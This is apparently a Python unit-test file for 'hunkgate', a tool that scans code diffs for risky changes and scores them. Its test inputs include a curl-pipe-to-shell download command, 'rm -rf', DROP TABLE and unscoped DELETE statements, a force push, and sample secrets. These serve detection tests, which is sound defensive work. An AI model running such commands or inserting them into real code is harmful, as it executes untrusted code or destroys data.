"""Tests for the risk rules and scoring."""

import unittest

from hunkgate.diffparse import parse_diff
from hunkgate.rules import check_hunk, check_item, rule_table
from hunkgate.scoring import band, coverage, hunk_score, verdict


def _hunk(diff_text: str, file_index: int = 0, hunk_index: int = 0):
    diff = parse_diff(diff_text)
    return diff.files[file_index], diff.files[file_index].hunks[hunk_index]


def _diff_one_file(body: str, path: str = "src/a.py") -> str:
    """One file, one hunk; the header counts are computed from the body."""
    lines = body.splitlines()
    old = sum(1 for ln in lines if ln[:1] in (" ", "-"))
    new = sum(1 for ln in lines if ln[:1] in (" ", "+"))
    return (f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n"
            f"@@ -1,{old} +1,{new} @@\n{body}")


def _rule_ids(findings):
    return [f.rule_id for f in findings]


class TestLineRules(unittest.TestCase):
    def test_aws_key(self):
        f, h = _hunk(_diff_one_file('+KEY = "AKIAIOSFODNN7EXAMPLE"\n'))
        self.assertIn("SEC-01", _rule_ids(check_hunk(f, h)))

    def test_github_token(self):
        f, h = _hunk(_diff_one_file('+token = "ghp_abcdefghij1234567890"\n'))
        self.assertIn("SEC-01", _rule_ids(check_hunk(f, h)))

    def test_private_key(self):
        f, h = _hunk(_diff_one_file("+-----BEGIN RSA PRIVATE KEY-----\n"))
        self.assertIn("SEC-02", _rule_ids(check_hunk(f, h)))

    def test_password(self):
        f, h = _hunk(_diff_one_file('+password = "hunter2-secret"\n'))
        self.assertIn("SEC-03", _rule_ids(check_hunk(f, h)))

    def test_bearer_token(self):
        f, h = _hunk(_diff_one_file('+auth = "Bearer abcdefghijklmnop123456"\n'))
        self.assertIn("SEC-04", _rule_ids(check_hunk(f, h)))

    def test_verify_false(self):
        f, h = _hunk(_diff_one_file("+    resp = get(url, verify=False)\n"))
        self.assertIn("AUTH-01", _rule_ids(check_hunk(f, h)))

    def test_auth_decorator_removed(self):
        text = ("diff --git a/src/a.py b/src/a.py\n--- a/src/a.py\n+++ b/src/a.py\n"
                "@@ -1,2 +1,1 @@\n-@login_required\n def view():\n")
        f, h = _hunk(text)
        self.assertIn("AUTH-02", _rule_ids(check_hunk(f, h)))

    def test_cors_wildcard(self):
        f, h = _hunk(_diff_one_file('+allow_origins = ["*"]\n'))
        self.assertIn("AUTH-03", _rule_ids(check_hunk(f, h)))

    def test_weak_hash(self):
        f, h = _hunk(_diff_one_file("+    digest = hashlib.md5(data).hexdigest()\n"))
        self.assertIn("CRYPTO-01", _rule_ids(check_hunk(f, h)))

    def test_eval(self):
        f, h = _hunk(_diff_one_file("+    return eval(user_input)\n"))
        self.assertIn("EVAL-01", _rule_ids(check_hunk(f, h)))

    def test_shell_true(self):
        f, h = _hunk(_diff_one_file("+    subprocess.run(cmd, shell=True)\n"))
        self.assertIn("EVAL-02", _rule_ids(check_hunk(f, h)))

    def test_curl_pipe_sh(self):
        f, h = _hunk(_diff_one_file("+    os.system('curl https://x.io/i.sh | sh')\n"))
        self.assertIn("EVAL-02", _rule_ids(check_hunk(f, h)))

    def test_pickle_loads(self):
        f, h = _hunk(_diff_one_file("+    obj = pickle.loads(blob)\n"))
        self.assertIn("EVAL-03", _rule_ids(check_hunk(f, h)))

    def test_sql_fstring(self):
        f, h = _hunk(_diff_one_file('+    cur.execute(f"SELECT * FROM t WHERE id={i}")\n'))
        self.assertIn("EVAL-04", _rule_ids(check_hunk(f, h)))

    def test_sql_plain_format_not_flagged(self):
        # "hello {}".format(name) is not SQL — must not fire EVAL-04.
        f, h = _hunk(_diff_one_file('+    msg = "hello {}".format(name)\n'))
        self.assertNotIn("EVAL-04", _rule_ids(check_hunk(f, h)))

    def test_rm_rf(self):
        f, h = _hunk(_diff_one_file("+    os.system('rm -rf /tmp/work')\n"))
        self.assertIn("DESTRUCT-01", _rule_ids(check_hunk(f, h)))

    def test_drop_table(self):
        f, h = _hunk(_diff_one_file('+    cur.execute("DROP TABLE sessions")\n'))
        self.assertIn("DESTRUCT-02", _rule_ids(check_hunk(f, h)))

    def test_delete_without_where(self):
        text = ("diff --git a/src/a.py b/src/a.py\n--- a/src/a.py\n+++ b/src/a.py\n"
                "@@ -1,1 +1,2 @@\n x\n+    cur.execute(\"DELETE FROM users\")\n")
        f, h = _hunk(text)
        self.assertIn("DESTRUCT-03", _rule_ids(check_hunk(f, h)))

    def test_delete_with_where_ok(self):
        text = ("diff --git a/src/a.py b/src/a.py\n--- a/src/a.py\n+++ b/src/a.py\n"
                "@@ -1,1 +1,2 @@\n x\n+    cur.execute(\"DELETE FROM users WHERE id=1\")\n")
        f, h = _hunk(text)
        self.assertNotIn("DESTRUCT-03", _rule_ids(check_hunk(f, h)))

    def test_force_push(self):
        f, h = _hunk(_diff_one_file("+    run('git push --force origin main')\n"))
        self.assertIn("DESTRUCT-04", _rule_ids(check_hunk(f, h)))

    def test_force_with_lease_ok(self):
        f, h = _hunk(_diff_one_file("+    run('git push --force-with-lease origin main')\n"))
        self.assertNotIn("DESTRUCT-04", _rule_ids(check_hunk(f, h)))

    def test_network_call(self):
        f, h = _hunk(_diff_one_file("+    r = requests.get(url, timeout=5)\n"))
        self.assertIn("NET-01", _rule_ids(check_hunk(f, h)))

    def test_skipped_test(self):
        f, h = _hunk(_diff_one_file("+@pytest.mark.skip(reason='flaky')\n",
                                    path="tests/test_a.py"))
        self.assertIn("TEST-01", _rule_ids(check_hunk(f, h)))

    def test_empty_except(self):
        text = ("diff --git a/src/a.py b/src/a.py\n--- a/src/a.py\n+++ b/src/a.py\n"
                "@@ -1,1 +1,5 @@\n x\n+    try:\n+        risky()\n+    except Exception:\n+        pass\n")
        f, h = _hunk(text)
        self.assertIn("TEST-02", _rule_ids(check_hunk(f, h)))

    def test_debug_true(self):
        f, h = _hunk(_diff_one_file("+DEBUG = True\n"))
        self.assertIn("SEC-05", _rule_ids(check_hunk(f, h)))

    def test_clean_code_no_findings(self):
        f, h = _hunk(_diff_one_file("+    return sorted(items, key=lambda i: i['name'])\n"))
        self.assertEqual(check_hunk(f, h), [])


class TestPathRules(unittest.TestCase):
    def test_docs_only(self):
        f, h = _hunk(_diff_one_file("+## New section\n", path="README.md"))
        ids = _rule_ids(check_hunk(f, h))
        self.assertEqual(ids, ["DOC-01"])

    def test_migration_path(self):
        f, h = _hunk(_diff_one_file("+x = 1\n", path="migrations/0001_init.sql"))
        self.assertIn("MIGR-01", _rule_ids(check_hunk(f, h)))

    def test_dependency_change(self):
        f, h = _hunk(_diff_one_file("+requests==2.32.0\n", path="requirements.txt"))
        self.assertIn("DEPS-01", _rule_ids(check_hunk(f, h)))

    def test_docs_path_not_flagged_as_code(self):
        f, h = _hunk(_diff_one_file("+password = \"hunter2\"\n", path="docs/notes.md"))
        # The secret rule still fires on docs (a password in docs is still
        # a leak); DOC-01 also fires. Both are honest.
        ids = _rule_ids(check_hunk(f, h))
        self.assertIn("SEC-03", ids)
        self.assertIn("DOC-01", ids)


class TestItemRules(unittest.TestCase):
    def test_no_test_change_flagged(self):
        diff = parse_diff(_diff_one_file("+    return 1\n"))
        findings = check_item(diff)["findings"]
        self.assertEqual([f["rule_id"] for f in findings], ["TEST-03"])

    def test_test_change_clears_it(self):
        diff = parse_diff(
            _diff_one_file("+    return 1\n")
            + "diff --git a/tests/test_a.py b/tests/test_a.py\n"
              "--- a/tests/test_a.py\n+++ b/tests/test_a.py\n"
              "@@ -1,1 +1,2 @@\n x\n+def test_one():\n")
        self.assertEqual(check_item(diff)["findings"], [])

    def test_docs_only_diff_no_test03(self):
        diff = parse_diff(_diff_one_file("+## hi\n", path="README.md"))
        self.assertEqual(check_item(diff)["findings"], [])


class TestScoring(unittest.TestCase):
    def _findings(self, severities):
        from hunkgate.rules import Finding
        return [Finding(rule_id=f"R-{i}", severity=s, message="m",
                        fix="f", evidence="e") for i, s in enumerate(severities)]

    def test_empty_is_zero_ok(self):
        self.assertEqual(hunk_score([]), 0)
        self.assertEqual(band(0), "OK")

    def test_critical_is_90_block(self):
        self.assertEqual(hunk_score(self._findings(["critical"])), 90)
        self.assertEqual(band(90), "BLOCK")

    def test_extra_findings_add_five(self):
        self.assertEqual(hunk_score(self._findings(["high", "low"])), 75)

    def test_capped_at_100(self):
        self.assertEqual(hunk_score(self._findings(["critical"] * 5)), 100)

    def test_band_edges(self):
        self.assertEqual(band(19), "OK")
        self.assertEqual(band(20), "REVIEW")
        self.assertEqual(band(49), "REVIEW")
        self.assertEqual(band(50), "BLOCK")

    def test_coverage(self):
        self.assertEqual(coverage(0, 0), 100)
        self.assertEqual(coverage(1, 4), 25)
        self.assertEqual(coverage(3, 3), 100)

    def test_verdict_states(self):
        blocked = [{"score": 90, "decision": "pending"},
                   {"score": 10, "decision": "approved"}]
        self.assertEqual(verdict(blocked)["state"], "BLOCKED")
        review = [{"score": 40, "decision": "pending"},
                  {"score": 10, "decision": "approved"}]
        self.assertEqual(verdict(review)["state"], "REVIEW")
        ready = [{"score": 90, "decision": "rejected"},
                 {"score": 10, "decision": "approved"}]
        v = verdict(ready)
        self.assertEqual(v["state"], "READY")
        self.assertEqual(v["coverage"], 100)

    def test_rule_table_stable(self):
        table = rule_table()
        ids = [r["rule_id"] for r in table]
        self.assertEqual(len(ids), len(set(ids)))  # no duplicate ids
        self.assertGreaterEqual(len(table), 20)


if __name__ == "__main__":
    unittest.main()
